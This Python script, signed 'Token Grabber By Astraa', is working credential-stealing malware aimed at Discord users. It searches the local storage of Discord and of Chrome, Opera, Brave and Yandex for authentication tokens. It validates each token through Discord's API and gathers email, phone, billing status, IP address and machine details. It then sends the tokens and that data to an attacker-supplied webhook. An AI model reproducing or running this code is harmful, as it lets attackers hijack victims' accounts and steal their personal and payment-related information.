import os
from platform import node
from getpass import getuser
from re import findall
from json import loads, dumps
from base64 import b64decode
from urllib.request import Request, urlopen
import ssl
ssl._create_default_https_context = ssl._create_unverified_context

WEBHOOK = "{WEBHOOK}"

if os.name == "nt":
    LOCAL = os.getenv("LOCALAPPDATA")
    ROAMING = os.getenv("APPDATA")

if os.name == "posix":
    ROAMING = os.path.expanduser("~/Library/Application Support")

PATHS = {
    "Discord": os.path.join(ROAMING, "Discord"),
    "Discord Canary": os.path.join(ROAMING, "discordcanary"),
    "Discord PTB": os.path.join(ROAMING, "discordptb"),
    }

if os.name == "nt":
    PATHS.update({
        "Google Chrome": os.path.join(LOCAL, "Google", "Chrome", "User Data", "Default"),
        "Opera": os.path.join(ROAMING, "Opera Software", "Opera Stable"),
        "Brave":  os.path.join(LOCAL, "BraveSoftware", "Brave-Browser", "User Data", "Default"),
        "Yandex": os.path.join(LOCAL, "Yandex", "YandexBrowser", "User Data", "Default")
    })


def gettokens(path):
    path = os.path.join(path, "Local Storage", "leveldb")
    tokens = []
    for file_name in os.listdir(path):
        if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
            continue
        lines = [x.strip() for x in open(os.path.join(path, file_name), errors="ignore").readlines() if x.strip()]
        for line in lines:
            for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                for token in findall(regex, line):
                    tokens.append(token)
    return tokens

def getheaders(token=None, content_type="application/json"):
    headers = {
        "Content-Type": content_type,
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
    }
    if token:
        headers.update({"Authorization": token})
    return headers


def getuserdata(token):
    try:
        return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=getheaders(token))).read().decode())
    except:
        pass


def getip():
    ip = "None"
    try:
        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
    except:
        pass
    return ip


def getavatar(uid, aid):
    url = f"https://cdn.discordapp.com/avatars/{uid}/{aid}.gif"
    try:
        urlopen(Request(url))
    except:
        url = url[:-4]
    return url


def has_payment_methods(token):
    try:
        return bool(len(loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers=getheaders(token))).read().decode())) > 0)
    except:
        pass


def main(WEBHOOK_URL):
    embeds = []
    working = []
    checked = []
    working_ids = []
    ip = getip()
    pc_username = getuser()
    pc_name = node()
    if os.name == 'posix':
        pc_name = pc_name.split(".")[0] if pc_name.find('.') else pc_name
    for platform, path in PATHS.items():
        if not os.path.exists(path):
            continue
        for token in gettokens(path):
            if token in checked:
                continue
            checked.append(token)
            uid = None
            if not token.startswith("mfa."):
                try:
                    uid = b64decode(token.split(".")[0].encode()).decode()
                except:
                    pass
                if not uid or uid in working_ids:
                    continue
            user_data = getuserdata(token)
            if not user_data:
                continue
            working_ids.append(uid)
            working.append(token)
            username = user_data["username"] + \
                "#" + str(user_data["discriminator"])
            user_id = user_data["id"]
            avatar_id = user_data["avatar"]
            avatar_url = getavatar(user_id, avatar_id)
            email = user_data.get("email")
            phone = user_data.get("phone")
            nitro = bool(user_data.get("premium_type"))
            billing = bool(has_payment_methods(token))
            embed = {
                "color": 0x7289da,
                "fields": [
                    {
                        "name": "**Account Info**",
                        "value": f'Email: {email}\nPhone: {phone}\nNitro: {nitro}\nBilling Info: {billing}',
                        "inline": True
                    },
                    {
                        "name": "**PC Info**",
                        "value": f'IP: {ip}\nUsername: {pc_username}\nPC Name: {pc_name}\nToken Location: {platform}',
                        "inline": True
                    },
                    {
                        "name": "**Token**",
                        "value": token,
                        "inline": False
                    }
                ],
                "author": {
                    "name": f"{username} ({user_id})",
                    "icon_url": avatar_url
                },
                "footer": {
                    "text": "Token Grabber By Astraa",
                }
            }
            embeds.append(embed)
    webhook = {
        "content": "",
        "embeds": embeds,
        "username": "Discord Token Grabber",
        "avatar_url": "https://discordapp.com/assets/5ccabf62108d5a8074ddd95af2211727.png"
    }
    try:
         urlopen(Request(WEBHOOK_URL, data=dumps(webhook).encode(), headers=getheaders()))
    except:
        pass


if __name__ == "__main__":
    main(WEBHOOK)
